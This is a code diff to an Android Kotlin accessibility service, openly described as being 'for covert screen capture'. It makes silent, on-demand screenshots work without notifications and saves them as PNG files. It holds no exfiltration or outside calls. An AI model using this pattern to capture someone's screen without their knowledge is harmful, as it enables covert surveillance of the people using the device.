@@ -2,43 +2,48 @@ package com.izhaanintellect.pasa.accessibility
 
 import android.accessibilityservice.AccessibilityService
 import android.graphics.Bitmap
+import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import android.util.Log
+import android.view.Display
 import android.view.accessibility.AccessibilityEvent
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.launch
 import java.io.File
 import java.io.FileOutputStream
+import java.util.concurrent.CountDownLatch
+import java.util.concurrent.TimeUnit
 
 /**
  * AccessibilityService for covert screen capture.
  *
  * This service runs in the background (after user enables it in Accessibility Settings)
  * and captures screenshots without any popups, notifications, or user interaction.
- *
- * Usage:
- * 1. User manually enables: Settings > Accessibility > PASA Screenshot Service > ON
- * 2. Commands call ScreenshotManager.captureScreenshot()
- * 3. Service captures frame silently and delivers file
- *
- * Lifecycle:
- * - onServiceConnected() when user enables in Settings
- * - onAccessibilityEvent() triggered by system events (not used for capture)
- * - onInterrupt() when user disables or system kills service
  */
 class AccessibilityScreenCaptureService : AccessibilityService() {
 
     companion object {
         private const val TAG = "PASA_A11yScreenCapture"
+
+        @Volatile
+        var instance: AccessibilityScreenCaptureService? = null
+            private set
     }
 
     override fun onServiceConnected() {
+        super.onServiceConnected()
+        instance = this
         Log.i(TAG, "AccessibilityScreenCaptureService connected - ready for screenshot capture")
     }
 
+    override fun onDestroy() {
+        super.onDestroy()
+        if (instance == this) {
+            instance = null
+        }
+    }
+
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        // We don't react to accessibility events; screenshots are triggered on-demand
-        // by ScreenshotManager.captureScreenshot()
+        // Screenshots are triggered on-demand via takeScreenshotInternal()
     }
 
     override fun onInterrupt() {
@@ -46,25 +51,64 @@ class AccessibilityScreenCaptureService : AccessibilityService() {
     }
 
     /**
-     * Capture the current screen as a PNG bitmap.
-     *
-     * This is called by ScreenshotManager via reflection/callback pattern.
-     * Returns a Bitmap if successful, null otherwise.
+     * Capture the current screen as a PNG file.
+     * Requires Android 11 (API 30)+ for AccessibilityService.takeScreenshot.
      */
     fun takeScreenshotInternal(outputDir: File): File? {
-        return try {
-            // takeScreenshot() requires API 28+
-            // It's called asynchronously, so we use a blocking approach with timeout
-            val bitmap = takeScreenshot() ?: return null
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            Log.w(TAG, "takeScreenshot requires Android 11 (API 30)+")
+            return null
+        }
 
-            // Save bitmap to PNG file
+        return try {
+            val latch = CountDownLatch(1)
+            var capturedBitmap: Bitmap? = null
+
+            val mainHandler = Handler(Looper.getMainLooper())
+            val executor = java.util.concurrent.Executor { command -> mainHandler.post(command) }
+
+            takeScreenshot(
+                Display.DEFAULT_DISPLAY,
+                executor,
+                object : TakeScreenshotCallback {
+                    override fun onSuccess(screenshotResult: ScreenshotResult) {
+                        try {
+                            val hardwareBuffer = screenshotResult.hardwareBuffer
+                            val colorSpace = screenshotResult.colorSpace
+                            val hwBitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
+                            if (hwBitmap != null) {
+                                capturedBitmap = hwBitmap.copy(Bitmap.Config.ARGB_8888, false)
+                                hwBitmap.recycle()
+                            }
+                            hardwareBuffer.close()
+                        } catch (e: Exception) {
+                            Log.e(TAG, "Error decoding hardware buffer to bitmap", e)
+                        } finally {
+                            latch.countDown()
+                        }
+                    }
+
+                    override fun onFailure(errorCode: Int) {
+                        Log.e(TAG, "Accessibility takeScreenshot failed with error code: $errorCode")
+                        latch.countDown()
+                    }
+                }
+            )
+
+            val awaited = latch.await(4, TimeUnit.SECONDS)
+            if (!awaited) {
+                Log.w(TAG, "Accessibility takeScreenshot timed out waiting for callback")
+                return null
+            }
+
+            val bitmap = capturedBitmap ?: return null
             val timestamp = System.currentTimeMillis()
             val outputFile = File(outputDir, "screenshot_$timestamp.png")
 
             FileOutputStream(outputFile).use { out ->
                 bitmap.compress(Bitmap.CompressFormat.PNG, 100, out)
-                bitmap.recycle()
             }
+            bitmap.recycle()
 
             Log.i(TAG, "Screenshot captured: ${outputFile.absolutePath} (${outputFile.length()} bytes)")
             outputFile
